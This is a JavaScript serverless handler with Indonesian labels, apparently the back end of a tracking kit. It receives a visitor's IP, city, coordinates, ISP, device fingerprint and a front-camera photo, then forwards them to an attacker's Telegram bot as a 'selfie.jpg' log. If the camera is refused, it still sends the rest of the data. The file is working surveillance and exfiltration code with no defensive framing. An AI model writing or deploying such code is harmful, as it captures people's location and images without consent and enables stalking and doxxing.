export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ ok:false });

  const { info, foto, bot, chat } = req.body || {};
  const BOT = process.env.TG_BOT || bot;
  const CHAT = process.env.TG_CHAT || chat;

  if (!BOT || !CHAT) return res.status(400).json({ ok:false, err:"no token" });

  const caption =
`🟢 LOG MASUK (FRONT CAM)
━━━━━━━━━━━━━━
🌐 IP      : ${info.ip}
📍 Kota    : ${info.kota}
🗺️ Region  : ${info.region}
🏳️ Negara  : ${info.negara}
📡 ISP     : ${info.isp}
🧭 Koord   : ${info.lat}, ${info.lon}
🕓 Zona    : ${info.timezone}
🕒 Waktu   : ${info.waktu}
━━━━━━━━━━━━━━
💻 UA      : ${info.ua}
🖥️ Platform: ${info.platform}
🗣️ Bahasa  : ${info.bahasa}
📐 Layar   : ${info.layar}
🔗 Referer : ${info.referer}`;

  try {
    if (foto) {
      const b64 = foto.split(",")[1];
      const buf = Buffer.from(b64, "base64");
      const form = new FormData();
      form.append("chat_id", CHAT);
      form.append("caption", caption);
      form.append("photo", new Blob([buf], { type:"image/jpeg" }), "selfie.jpg");

      await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {
        method: "POST",
        body: form
      });
    } else {
      await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type":"application/json" },
        body: JSON.stringify({ chat_id: CHAT, text: caption + "\n\n⚠️ Kamera depan ditolak/gagal." })
      });
    }
    return res.status(200).json({ ok:true });
  } catch (e) {
    return res.status(500).json({ ok:false, err: e.message });
  }
}
